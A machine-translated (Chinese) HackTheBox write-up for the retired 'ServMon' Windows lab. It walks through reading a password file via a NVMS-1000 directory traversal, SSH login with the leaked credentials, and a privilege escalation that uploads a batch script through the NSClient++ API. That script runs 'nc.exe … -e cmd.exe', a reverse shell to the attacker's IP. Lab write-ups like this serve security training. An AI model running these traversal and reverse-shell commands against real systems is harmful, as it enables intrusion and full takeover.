<html>
<head>
<title>ServMon — HackTheBox Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ServMon — HackTheBox编写</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/servmon-hackthebox-writeup-925d74baff17?source=collection_archive---------2-----------------------#2020-06-22">https://infosecwriteups.com/servmon-hackthebox-writeup-925d74baff17?source=collection_archive---------2-----------------------#2020-06-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="f059" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Servmon是本周即将退役的一款简单难度的windows机器。我们将从发现匿名FTP访问开始，通过<a class="ae kf" href="https://www.exploit-db.com/exploits/48311" rel="noopener ugc nofollow" target="_blank">目录遍历</a>从运行在端口80上的NVMS获得SSH信用。对于权限提升，我们通过SSH隧道利用NSClient++并通过它的<a class="ae kf" href="https://docs.nsclient.org/api/" rel="noopener ugc nofollow" target="_blank"> API </a>上传我们的恶意脚本。</h2></div><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi kg"><img src="../Images/b44cb473418c85864fe36fbcab6a6bdb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cVs4TA0vUZnUKcUxwtqHSA.png"/></div></div></figure><h1 id="5c57" class="ks kt iq bd ku kv kw kx ky kz la lb lc jw ld jx le jz lf ka lg kc lh kd li lj bi translated">侦察</h1><p id="9e43" class="pw-post-body-paragraph lk ll iq lm b ln lo jr lp lq lr ju ls lt lu lv lw lx ly lz ma mb mc md me mf ij bi mg translated">像往常一样，让我们从Nmap扫描开始</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="4f0e" class="mu kt iq mq b gy mv mw l mx my"><strong class="mq ir">Nmap scan report for 10.10.10.184                         <br/>Host is up (0.41s latency).                               <br/>                                                          <br/>PORT     STATE SERVICE       VERSION                      <br/>21/tcp   open  ftp           Microsoft ftpd                                                                          <br/>| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                               <br/>|_01-18-20  12:05PM       &lt;DIR&gt;          Users                                                                       <br/>| ftp-syst:                                               <br/>|_  SYST: Windows_NT                                      <br/>22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)                                                                                                                                                                        <br/>| ssh-hostkey:                                                                                                                                                                                                                             <br/>|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)                                                       <br/>|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)                                                      <br/>|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)                                                    <br/>80/tcp   open  http                                       <br/>| fingerprint-strings:                                    <br/>|   FourOhFourRequest:                                    <br/>|     HTTP/1.1 404 Not Found                              <br/>|     Content-type: text/html                             <br/>|     Content-Length: 0                                   <br/>|     Connection: close                                   <br/>|     AuthInfo:                                           <br/>|   GetRequest, HTTPOptions, RTSPRequest:                                                                            <br/>|     HTTP/1.1 200 OK                                     <br/>|     Content-type: text/html                             <br/>|     Content-Length: 340                                 <br/>|     Connection: close                                   <br/>|     AuthInfo:                                           <br/>|     &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "</strong><a class="ae kf" href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd" rel="noopener ugc nofollow" target="_blank"><strong class="mq ir">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd</strong></a><strong class="mq ir">"&gt;                                                                                                            <br/>|     &lt;html ae kf" href="http://www.w3.org/1999/xhtml" rel="noopener ugc nofollow" target="_blank"&gt;<strong class="mq ir">http://www.w3.org/1999/xhtml</strong><strong class="mq ir">"&gt;                                                                    <br/>|     &lt;head&gt;                                              <br/>|     &lt;title&gt;&lt;/title&gt;                                     <br/>|     &lt;script type="text/javascript"&gt;                     <br/>|     window.location.href = "Pages/login.htm";                                                                      <br/>|     &lt;/script&gt;                                           <br/>|     &lt;/head&gt;                                             <br/>|     &lt;body&gt;                                              <br/>|     &lt;/body&gt;                                             <br/>|_    &lt;/html&gt;                                             <br/>|_http-title: Site doesn't have a title (text/html).                                                                 <br/>135/tcp  open  msrpc         Microsoft Windows RPC                                                                   <br/>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                           <br/>445/tcp  open  microsoft-ds?                              <br/>5666/tcp open  tcpwrapped                                 <br/>6699/tcp open  napster?                                   <br/>8443/tcp open  ssl/https-alt                              <br/>| fingerprint-strings:                                    <br/>|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:                                                         <br/>|     HTTP/1.1 404                                        <br/>|     Content-Length: 18                                  <br/>|     Document not found                                  <br/>|   GetRequest:                                           <br/>|     HTTP/1.1 302                                        <br/>|     Content-Length:0|     Document not found                                  <br/>|   GetRequest:                                           <br/>|     HTTP/1.1 302                                        <br/>|     Content-Length: 0                                   <br/>|     Location: /index.html                               <br/>|     workers                                             <br/>|_    jobs                                                <br/>| http-title: NSClient++                                  <br/>|_Requested resource was /index.html                      <br/>| ssl-cert: Subject: commonName=localhost                 <br/>| Not valid before: 2020-01-14T13:24:20                   <br/>|_Not valid after:  2021-01-13T13:24:20                   <br/>|_ssl-date: TLS randomness does not represent time</strong></strong></span></pre><h1 id="c10c" class="ks kt iq bd ku kv kw kx ky kz la lb lc jw ld jx le jz lf ka lg kc lh kd li lj bi translated">FTP —匿名访问</h1><p id="531f" class="pw-post-body-paragraph lk ll iq lm b ln lo jr lp lq lr ju ls lt lu lv lw lx ly lz ma mb mc md me mf ij bi translated">因为允许匿名FTP访问，所以让我们列举FTP</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="bc26" class="mu kt iq mq b gy mv mw l mx my"><strong class="mq ir">wget -r ftp://anonymous:saddfd@10.10.10.184/Users</strong></span></pre><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi mz"><img src="../Images/89f732d974c6fd5719d80ffaa4482194.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*le6Iylv6YECrWKzfp55_Cg.png"/></div></div></figure><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi na"><img src="../Images/5746471f227896c6beaa5367e27d9264.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MQcLeSYsOQiegC8ZK4r8jg.png"/></div></div></figure><p id="7cb6" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我们在<code class="fe ng nh ni mq b">Nathan's</code>桌面上有一个<code class="fe ng nh ni mq b">passwords.txt</code>文件，让我们保留它以备将来使用，也许会派上用场。</p><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi nj"><img src="../Images/fad076c2e2094fcc2edf934c8440b548.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YtmcdQvKXph8L52T6mRNKA.png"/></div></div></figure><h1 id="d669" class="ks kt iq bd ku kv kw kx ky kz la lb lc jw ld jx le jz lf ka lg kc lh kd li lj bi translated">HTTP 80 — NVMS 1000</h1><h2 id="e31c" class="mu kt iq bd ku nk nl dn ky nm nn dp lc lt no np le lx nq nr lg mb ns nt li nu bi translated">人工访问</h2><p id="0e64" class="pw-post-body-paragraph lk ll iq lm b ln lo jr lp lq lr ju ls lt lu lv lw lx ly lz ma mb mc md me mf ij bi translated">在手动访问<code class="fe ng nh ni mq b"><a class="ae kf" href="http://10.10.10.184" rel="noopener ugc nofollow" target="_blank">http://10.10.10.184</a></code>时，我们会看到一个<code class="fe ng nh ni mq b">NVMS 1000</code>登录页面。</p><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi nv"><img src="../Images/b7091907802424c65c5dfb5d27fce82a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XoWYUFddsr2caj60DhfP9g.png"/></div></div></figure><p id="c160" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">默认凭证<code class="fe ng nh ni mq b">admin : 123456</code>不起作用。这是NVMS-1000的用户手册</p><figure class="kh ki kj kk gt kl"><div class="bz fp l di"><div class="nw nx l"/></div></figure><p id="00d4" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">在搜索可能利用<code class="fe ng nh ni mq b"><strong class="lm ir">NVMS-1000</strong></code> <strong class="lm ir">、</strong>的漏洞时，我们进行了一次目录遍历，并了解了Nathan桌面上的<em class="ny"> passwords.txt文件</em>，这次目录遍历可能非常有用。</p><h2 id="f7e9" class="mu kt iq bd ku nk nl dn ky nm nn dp lc lt no np le lx nq nr lg mb ns nt li nu bi translated">目录遍历</h2><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="66d5" class="mu kt iq mq b gy mv mw l mx my"><strong class="mq ir">curl --path-as-is </strong><a class="ae kf" href="http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt" rel="noopener ugc nofollow" target="_blank"><strong class="mq ir">http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt</strong></a><strong class="mq ir">  -s</strong></span></pre><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi nz"><img src="../Images/0b946d04116cd9b71c021d02de88aa76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hHtY7gIeyIM4BP56cy7E2Q.png"/></div></div></figure><h1 id="6fb2" class="ks kt iq bd ku kv kw kx ky kz la lb lc jw ld jx le jz lf ka lg kc lh kd li lj bi translated"><strong class="ak">初始立足点</strong></h1><p id="4926" class="pw-post-body-paragraph lk ll iq lm b ln lo jr lp lq lr ju ls lt lu lv lw lx ly lz ma mb mc md me mf ij bi translated">因为我们有几个用户名和密码，所以有必要喷一下。我先试试ssh，因为它直接给了我们一个shell。</p><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi oa"><img src="../Images/d10e9e26ff78aeac6147775e3863139c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YDTu1VZQKnZWDCLJ5lR67A.png"/></div></div></figure><p id="c505" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我们有一个热门话题,《贝壳时间》。</p><h1 id="2840" class="ks kt iq bd ku kv kw kx ky kz la lb lc jw ld jx le jz lf ka lg kc lh kd li lj bi translated">贝壳为纳丁</h1><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="f06a" class="mu kt iq mq b gy mv mw l mx my"><strong class="mq ir">ssh nadine@10.10.10.184    #password L1k3B1gBut7s@W0rk</strong></span></pre><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi ob"><img src="../Images/0bb90ab1413908305ff52113f672e22e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HbH5L36Yb5xrED6veCXzsQ.png"/></div></div></figure><p id="d0b0" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我们可以从这里获取用户标志。</p><h1 id="e356" class="ks kt iq bd ku kv kw kx ky kz la lb lc jw ld jx le jz lf ka lg kc lh kd li lj bi translated">权限提升</h1><p id="c76e" class="pw-post-body-paragraph lk ll iq lm b ln lo jr lp lq lr ju ls lt lu lv lw lx ly lz ma mb mc md me mf ij bi translated">在windows机器上，在运行任何权限提升脚本之前，我会尝试检查低挂果实，例如，我会检查机器上安装的程序和内核漏洞。这个方法在我的OSCP之旅中帮助了我:)，我希望它对你也有帮助…</p><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi oc"><img src="../Images/e74edb5a4e884f9db3a8ef1ae2164ebd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ePoiwv-bbh3WELmBtw3ZFg.png"/></div></div></figure><p id="ad24" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我们已经安装了NSClient++，这一点我们已经在初始Nmap扫描中看到了。</p><p id="fdde" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我们可以通过下面的文章获得<code class="fe ng nh ni mq b"><strong class="lm ir">NSClient++</strong></code> <strong class="lm ir"> </strong>的配置细节</p><div class="od oe gp gr of og"><a href="https://www.exploit-db.com/exploits/46802" rel="noopener  ugc nofollow" target="_blank"><div class="oh ab fo"><div class="oi ab oj cl cj ok"><h2 class="bd ir gy z fp ol fr fs om fu fw ip bi translated">攻击性安全利用数据库档案</h2><div class="on l"><h3 class="bd b gy z fp ol fr fs om fu fw dk translated">漏洞作者:bzyo Twitter:@ bzyo _ Exploit Title:ns client ++ 0 . 5 . 2 . 35-权限提升日期:05-05-19…</h3></div><div class="oo l"><p class="bd b dl z fp ol fr fs om fu fw dk translated">www.exploit-db.com</p></div></div><div class="op l"><div class="oq l or os ot op ou kq og"/></div></div></a></div><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="5670" class="mu kt iq mq b gy mv mw l mx my"><strong class="mq ir">nadine@SERVMON C:\Program Files\NSClient++&gt;nscp web -- password --display<br/>Current password: ew2x6SsGTxjRwXOT</strong></span></pre><h2 id="a14b" class="mu kt iq bd ku nk nl dn ky nm nn dp lc lt no np le lx nq nr lg mb ns nt li nu bi translated">SSH隧道</h2><p id="367d" class="pw-post-body-paragraph lk ll iq lm b ln lo jr lp lq lr ju ls lt lu lv lw lx ly lz ma mb mc md me mf ij bi translated">读取<code class="fe ng nh ni mq b"><strong class="lm ir">nsclient.ini</strong></code> <strong class="lm ir"> </strong>文件，我们可以看到它只接受来自本地主机的连接。</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="2049" class="mu kt iq mq b gy mv mw l mx my">nadine@SERVMON C:\Program Files\NSClient++&gt;type nsclient.ini                                                                                                               <br/># If you want to fill this file with all available options run the following command:                                                                                   ]<br/>#   nscp settings --generate --add-defaults --load-all                                                                                                                     <br/># If you want to activate a module and bring in all its options use:                                                                                                       <br/>#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults                                                                                                           <br/># For details run: nscp settings --help                                                                                                                                    <br/>                                                                                                                                                                           <br/>                                                                                                                                                                           <br/>; in flight - TODO                                                                                                                                                         <br/>[/settings/default]                                                                                                                                                        <br/>                                                                                                                                                                           <br/>; Undocumented key                                                                                                                                                         <br/>password = ew2x6SsGTxjRwXOT                                                                                                                                                <br/>                                                                                                                                                                           <br/><strong class="mq ir"><em class="ny">; Undocumented key                                                                                                                                                         <br/>allowed hosts = 127.0.0.1</em></strong></span></pre><p id="2c29" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我用这个隧道8443端口，</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="be77" class="mu kt iq mq b gy mv mw l mx my">1. On your SSH shell<br/>2. Press enter twice<br/>3. Hit ~C<br/>4. Now do this <strong class="mq ir"><em class="ny">ssh&gt; -L 8443:127.0.0.1:8443</em></strong></span></pre><p id="20cb" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我可以通过以下方式确认</p><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi ov"><img src="../Images/7861d95f1a49f1e1f6ed8cd262f78bf0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JhUzeZcMy8mKCLdrKX5DxA.png"/></div></div></figure><p id="f63b" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">浏览NSClient++ API文档，有一个上传脚本的功能</p><div class="od oe gp gr of og"><a href="https://docs.nsclient.org/api/scripts/#add-script" rel="noopener  ugc nofollow" target="_blank"><div class="oh ab fo"><div class="oi ab oj cl cj ok"><h2 class="bd ir gy z fp ol fr fs om fu fw ip bi translated">脚本- NSClient++</h2><div class="on l"><h3 class="bd b gy z fp ol fr fs om fu fw dk translated">脚本API可用于读取、查看和修改NSClient++可以运行的脚本。因为可以提供脚本…</h3></div><div class="oo l"><p class="bd b dl z fp ol fr fs om fu fw dk translated">docs.nsclient.org</p></div></div></div></a></div><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="0d3d" class="mu kt iq mq b gy mv mw l mx my">curl -s -k -u admin -X PUT <a class="ae kf" href="https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat" rel="noopener ugc nofollow" target="_blank">https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat</a> --data-binary <a class="ae kf" href="http://twitter.com/cyber" rel="noopener ugc nofollow" target="_blank">@cyber</a>.bat</span></pre><p id="ac5a" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">其中<code class="fe ng nh ni mq b">cyber.bat</code>是我的恶意脚本。</p><p id="1fa4" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">首先，我将把<code class="fe ng nh ni mq b"><strong class="lm ir">netcat</strong></code> <strong class="lm ir"> </strong> exe上传到机器上，并在<code class="fe ng nh ni mq b">cyber.bat</code>文件中添加反向连接脚本，从而给我一个反向shell。</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="721c" class="mu kt iq mq b gy mv mw l mx my"><strong class="mq ir">scp nc.exe nadine@10.10.10.184:C:\Users\Nadine\Downloads\nc.exe   </strong>                                                                                                          </span></pre><p id="7d6a" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">这是我的恶意脚本，<code class="fe ng nh ni mq b">cyber.bat</code></p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="32c2" class="mu kt iq mq b gy mv mw l mx my">root@kali:~/htb/boxes/servmon# cat cyber.bat <br/><a class="ae kf" href="http://twitter.com/echo" rel="noopener ugc nofollow" target="_blank">@echo</a> off<br/>C:\USers\Nadine\Downloads\nc.exe 10.10.14.132 5555 -e cmd.exe</span></pre><p id="45d4" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">现在，使用一个简单的cURL命令</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="740d" class="mu kt iq mq b gy mv mw l mx my">curl -s -k -u admin -X PUT <a class="ae kf" href="https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat" rel="noopener ugc nofollow" target="_blank">https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat</a> --data-binary <a class="ae kf" href="http://twitter.com/cyber" rel="noopener ugc nofollow" target="_blank">@cyber</a>.bat</span></pre><p id="b50b" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">这是上面的输出</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="b137" class="mu kt iq mq b gy mv mw l mx my">root@kali:~/htb/boxes/servmon# curl -s -k -u admin -X PUT <a class="ae kf" href="https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat" rel="noopener ugc nofollow" target="_blank">https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat</a> --data-binary <a class="ae kf" href="http://twitter.com/cyber" rel="noopener ugc nofollow" target="_blank">@cyber</a>.bat -v                                                        [51/198]<br/>Enter host password for user 'admin':                                                                                                                                                                            <br/>*   Trying ::1:8443...                                                                                                                                                     <br/>* TCP_NODELAY set                                                                                                                                                          <br/>* Connected to localhost (::1) port 8443 (#0)                                                                                                                              <br/>* ALPN, offering h2                                                                                                                                                        <br/>* ALPN, offering http/1.1                                                                                                                                                  <br/>* successfully set certificate verify locations:                                                                                                                           <br/>*   CAfile: none                                                                                                                                                           <br/>  CApath: /etc/ssl/certs                                                                                                                                                   <br/>* TLSv1.3 (OUT), TLS handshake, Client hello (1):                                                                                                                          <br/>* TLSv1.3 (IN), TLS handshake, Server hello (2):                                                                                                                           <br/>* TLSv1.2 (IN), TLS handshake, Certificate (11):                                                                                                                           <br/>* TLSv1.2 (IN), TLS handshake, Server finished (14):                                                                                                                       <br/>* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):                                                                                                                  <br/>* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):                                                                                                                <br/>* TLSv1.2 (OUT), TLS handshake, Finished (20):                                                                                                                             <br/>* TLSv1.2 (IN), TLS handshake, Finished (20):                                                                                                                              <br/>* SSL connection using TLSv1.2 / AES256-GCM-SHA384                                                                                                                         <br/>* ALPN, server did not agree to a protocol                                                                                                                                 <br/>* Server certificate:                                                                                                                                                      <br/>*  subject: CN=localhost                                                                                                                                                   <br/>*  start date: Jan 14 13:24:20 2020 GMT                                                                                                                                    <br/>*  expire date: Jan 13 13:24:20 2021 GMT                                                                                                                                   <br/>*  issuer: CN=localhost                                                                                                                                                    <br/>*  SSL certificate verify result: self signed certificate (18), continuing anyway.                                                                                         <br/>* Server auth using Basic with user 'admin'                                                                                                                                <br/>&gt; PUT /api/v1/scripts/ext/scripts/cyber.bat HTTP/1.1                                                                                                                       <br/>&gt; Host: localhost:8443                                                                                                                                                     <br/>&gt; Authorization: Basic YWRtaW46ZXcyeDZTc0dUeGpSd1hPVA==                                                                                                                    <br/>&gt; User-Agent: curl/7.66.0                                                                                                                                                  <br/>&gt; Accept: */*                                                                                                                                                              <br/>&gt; Content-Length: 72                                                                                                                                                       <br/>&gt; Content-Type: application/x-www-form-urlencoded                                                                                                                          <br/>&gt;                                                                                                                                                                          <br/>* upload completely sent off: 72 out of 72 bytes                                                                                                                           <br/>* Mark bundle as not supporting multiuse                                                                                                                                   <br/>&lt; HTTP/1.1 200                                 <br/>&lt; Content-Length: 32                           <br/>* Added cookie token="frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ" for domain localhost, path /, expire 0                                                                                              <br/>&lt; Set-cookie: token=frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ; path=/                                  <br/>* Added cookie uid="admin" for domain localhost, path /, expire 0                             <br/>&lt; Set-cookie: uid=admin; path=/                <br/>&lt;                                                   <br/>* Excess found in a read: excess = 318, size = 32, maxdownload = 32, bytecount = 0                      <br/>* Connection #0 to host localhost left intact                                                           <br/><strong class="mq ir"><em class="ny">Added cyber as scripts\cyber.bat</em></strong></span></pre><p id="63aa" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我们已经添加了一个脚本作为<code class="fe ng nh ni mq b">cyber.bat</code></p><p id="82cd" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">通过另一个简单的cURL命令执行脚本</p><pre class="kh ki kj kk gt mp mq mr ms aw mt bi"><span id="32dd" class="mu kt iq mq b gy mv mw l mx my"><strong class="mq ir">curl -s -k -u admin "</strong><a class="ae kf" href="https://localhost:8443/api/v1/queries/cyber/commands/execute?time=1m" rel="noopener ugc nofollow" target="_blank"><strong class="mq ir">https://localhost:8443/api/v1/queries/cyber/commands/execute?time=1m</strong></a><strong class="mq ir">"</strong></span></pre><figure class="kh ki kj kk gt kl gh gi paragraph-image"><div role="button" tabindex="0" class="km kn di ko bf kp"><div class="gh gi ow"><img src="../Images/0be656c70431c785f33e0c2bfeccbf29.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cQ3_T0nGYqdNbTeQti_slw.png"/></div></div></figure><p id="14e5" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">我们获得外壳为<code class="fe ng nh ni mq b"><strong class="lm ir">ntauthority\system</strong></code></p><p id="3060" class="pw-post-body-paragraph lk ll iq lm b ln nb jr lp lq nc ju ls lt nd lv lw lx ne lz ma mb nf md me mf ij bi translated">退出；</p></div></div>    
</body>
</html>